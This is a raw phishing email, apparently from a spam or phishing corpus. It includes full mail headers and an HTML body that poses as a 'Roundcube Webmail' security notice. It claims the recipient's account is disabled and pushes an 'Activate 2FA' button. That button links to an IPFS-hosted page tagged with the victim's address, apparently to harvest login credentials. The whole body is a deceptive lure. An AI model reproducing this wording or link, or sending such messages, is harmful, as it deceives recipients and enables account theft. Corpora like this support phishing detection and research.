@@ -1,0 +1,130 @@
+Return-Path: alvis@nguynththominh.cfd
+Delivered-To: jose@monkey.org
+X-FDA: 81964771308.02.3A1A88B
+Received: from mail.nguynththominh.cfd (mail.nguynththominh.cfd
+ [165.227.109.131])	by imf28.b.hostedemail.com (Postfix) with ESMTP id
+ 7EA07100004	for <jose@monkey.org>; Tue,  2 Apr 2024 14:08:13 +0000 (UTC)
+Authentication-Results: imf28.b.hostedemail.com;	dkim=none;	spf=pass
+ (imf28.b.hostedemail.com: domain of alvis@nguynththominh.cfd designates
+ 165.227.109.131 as permitted sender) smtp.mailfrom=alvis@nguynththominh.cfd;
+	dmarc=pass (policy=none) header.from=nguynththominh.cfd
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1712066893;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	 references;
+ bh=yq3t6r6hslutKRtMXSceQgYxNcCALHAJolqIdPEn9R8=;
+	b=Q5ZsDTilwAsrgQ7SRRytjAOoPmiHA3znHbmuPUA2o/r5gyWa8Y0Q0zoU++6bUsQwuEOZof
+	cA1ET0Oh+kfOp7ToD7EMHBxlU3VfyttfpMvu1zdxNzOzmQ4DNLoamfiTP3MGWcP0hWcFHy
+	pMWavGmRzotLsH7oc2g2RXRN3aOgQDI=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1712066893; a=rsa-sha256;
+	cv=none;
+	b=0UAR4CEGs7Utxt3FcXP+G3VeeYdQWMxNepKG+MspPanVZ+ne4LpwQ0SaY/7rM34ZUEofD0
+	TR4sw6qqg8GNoGW1932chFJ1cAuwzcgahlm97VSZZ2ml5M3B/YX9ab1Ei2aV4erHxu3BoV
+	9un2MvadRWzzmrXnDZZkG+WGZIpUclA=
+ARC-Authentication-Results: i=1;	imf28.b.hostedemail.com;	dkim=none;	spf=pass
+ (imf28.b.hostedemail.com: domain of alvis@nguynththominh.cfd designates
+ 165.227.109.131 as permitted sender) smtp.mailfrom=alvis@nguynththominh.cfd;
+	dmarc=pass (policy=none) header.from=nguynththominh.cfd
+Received: from nguynththominh.cfd (unknown [185.222.57.73])
+	by mail.nguynththominh.cfd (Postfix) with ESMTPA id B54A985BC3
+	for <jose@monkey.org>; Tue,  2 Apr 2024 05:32:35 -0800 (AKDT)
+From: "Roundcube Webmail" <alvis@nguynththominh.cfd>
+To: jose@monkey.org
+Subject: jose@monkey.org  Urgent Validation For Email Security
+Date: 02 Apr 2024 15:32:35 +0200
+Message-ID: <20240402153235.688339BA394B632A@nguynththominh.cfd>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam12
+X-Rspam-User: 
+X-Spam-Status: No, score=5.30
+X-Stat-Signature: bmg7qyrkixr9swmog9i8id87jydgpjbd
+X-Rspamd-Queue-Id: 7EA07100004
+X-HE-Tag: 1712066893-148157
+X-HE-Meta: =?utf-8?q?U2FsdGVkX1+yqWIRZKV0Qt3UMC1LrPJ5tPJD8hoEovRNI1TROeNq7rd?=
+ =?utf-8?q?2sIaSbPIrto9u5V5PTpaQ3H1mtBOF1zJoDj/DkNKDcOv2oB94NM5ZC6BQe6sx2F7r?=
+ =?utf-8?q?GRLQ5339qHupsSVrBhidXqvXlq10uFugb1eJNLWJb4h5fk0W+G6tI+dDZnpez8rZN?=
+ =?utf-8?q?xGKkjBpNdtVHHMEjNUM1czTlbQ5k4JEESooQ//5g98kMGTcwA51Mo6AY4LUAorNqL?=
+ =?utf-8?q?dpg4u7edgbiiVKv4JwdvntePO8pSCf/B9fAw+97zzm2M5EMcAI2hEvLAphT7VwuFD?=
+ =?utf-8?q?eNoccdCUdo1CSld2jeVizrjwTFzQyLrQ1U5dWX7bE7MVKJgeWHisXeUM9uTZ8iSKE?=
+ =?utf-8?q?1gQbkImUMrqeKm3fRlqYNURYl2V/r+gBx5yVsysb+gl8196vAOTX0924Noz+zmij9?=
+ =?utf-8?q?CY4?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 89
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.17037"></HEAD>
+<body>
+<P> </P>
+<H1 style=3D"FONT-FAMILY: Arial,sans-serif; WHITE-SPACE: normal; WORD-SPACI=
+NG: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 500; COLOR: rgb(51,51,51); FONT=
+-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS: 2; MARGIN-TOP: 0px;=
+ LETTER-SPACING: normal; LINE-HEIGHT: 1.2; TEXT-INDENT: 0px">Important Acco=
+unt Security Notification</H1>
+<P style=3D"FONT-SIZE: 14px; FONT-FAMILY: Arial,sans-serif; WHITE-SPACE: no=
+rmal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb=
+(85,85,85); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; MA=
+RGIN-TOP: 0px; LETTER-SPACING: normal; LINE-HEIGHT: 1.5; TEXT-INDENT: 0px">=
+Dear jose@monkey.org<BR></P>
+<P style=3D"FONT-SIZE: 14px; FONT-FAMILY: Arial,sans-serif; WHITE-SPACE: no=
+rmal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb=
+(85,85,85); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; MA=
+RGIN-TOP: 0px; LETTER-SPACING: normal; LINE-HEIGHT: 1.5; TEXT-INDENT: 0px">=
+We hope this email finds you well. Our security systems have detected some =
+unusual activity on your account, leading us to take action to protect your=
+ account.</P>
+<P style=3D"FONT-SIZE: 14px; FONT-FAMILY: Arial,sans-serif; WHITE-SPACE: no=
+rmal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb=
+(85,85,85); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; MA=
+RGIN-TOP: 0px; LETTER-SPACING: normal; LINE-HEIGHT: 1.5; TEXT-INDENT: 0px">=
+
+For your safety, your account has been temporarily disabled. To restore acc=
+ess and enhance the security of your account, we strongly advise you to act=
+ivate Two-Factor Authentication (2FA) without delay.</P>
+<P style=3D"FONT-SIZE: 14px; FONT-FAMILY: Arial,sans-serif; WHITE-SPACE: no=
+rmal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb=
+(85,85,85); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; MA=
+RGIN-TOP: 0px; LETTER-SPACING: normal; LINE-HEIGHT: 1.5; TEXT-INDENT: 0px">=
+Click the button below to activate 2FA:</P>
+<P style=3D"FONT-SIZE: 14px; FONT-FAMILY: Arial,sans-serif; WHITE-SPACE: no=
+rmal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb=
+(85,85,85); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; MA=
+RGIN-TOP: 0px; LETTER-SPACING: normal; LINE-HEIGHT: 1.5; TEXT-INDENT: 0px">=
+
+<A class=3Dv1cta-button style=3D"FONT-SIZE: 16px; TEXT-DECORATION: none; FO=
+NT-WEIGHT: bold; COLOR: rgb(255,255,255); PADDING-BOTTOM: 10px; TEXT-ALIGN:=
+ center; PADDING-TOP: 10px; PADDING-LEFT: 20px; PADDING-RIGHT: 20px; BACKGR=
+OUND-COLOR: rgb(0,123,255)" href=3D"https://ipfs.io/ipfs/QmeWASc6XMLWrx7Qys=
+QdpTTCQHwqk2LthS3SZw87fJqVsb/#jose@monkey.org" rel=3Dnoreferrer target=3D_b=
+lank>Activate 2FA</A></P>
+<P style=3D"FONT-SIZE: 14px; FONT-FAMILY: Arial,sans-serif; WHITE-SPACE: no=
+rmal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb=
+(85,85,85); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; MA=
+RGIN-TOP: 0px; LETTER-SPACING: normal; LINE-HEIGHT: 1.5; TEXT-INDENT: 0px">=
+If you encounter any challenges or have concerns, our dedicated support tea=
+m is ready to assist you.</P>
+<P style=3D"FONT-SIZE: 14px; FONT-FAMILY: Arial,sans-serif; WHITE-SPACE: no=
+rmal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb=
+(85,85,85); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; MA=
+RGIN-TOP: 0px; LETTER-SPACING: normal; LINE-HEIGHT: 1.5; TEXT-INDENT: 0px">=
+Your prompt attention to this matter is highly appreciated, as it contribut=
+es to the continued security of your account.</P>
+<P style=3D"FONT-SIZE: 14px; FONT-FAMILY: Arial,sans-serif; WHITE-SPACE: no=
+rmal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb=
+(85,85,85); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; MA=
+RGIN-TOP: 0px; LETTER-SPACING: normal; LINE-HEIGHT: 1.5; TEXT-INDENT: 0px">=
+Best regards,<BR>2024 Roundcube Webmail. All rights reserved.</P>
+<P style=3D"FONT-SIZE: 14px; FONT-FAMILY: Arial,sans-serif; WHITE-SPACE: no=
+rmal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb=
+(85,85,85); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; MA=
+RGIN-TOP: 0px; LETTER-SPACING: normal; LINE-HEIGHT: 1.5; TEXT-INDENT: 0px">=
+This email is part of our ongoing commitment to ensuring the utmost securit=
+y for your account. If you did not initiate this action, please contact us =
+immediately.</P></BODY></HTML>
+
